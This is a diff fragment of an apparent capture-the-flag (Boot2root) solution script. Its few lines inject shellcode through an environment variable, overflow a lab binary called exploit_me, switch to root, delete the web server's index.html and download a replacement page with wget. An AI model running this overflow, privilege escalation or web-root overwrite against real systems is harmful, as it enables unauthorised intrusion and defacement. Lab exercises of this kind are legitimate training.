@@ -2,4 +2,3 @@ export SHELLCODE=$(python -c 'print "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x61\x64\x6
 env - PWD=$PWD SHELLCODE="$SHELLCODE" ~/exploit_me $(python -c 'print "A" * 140 + "\xbf\xff\xff\x0e"[::-1]')
 su root
 cd /var/www && rm index.html && wget https://raw.githubusercontent.com/Alixmixx/Boot2root/main/scripts/bonus/dontTouchMyWebSocket/index.html
-
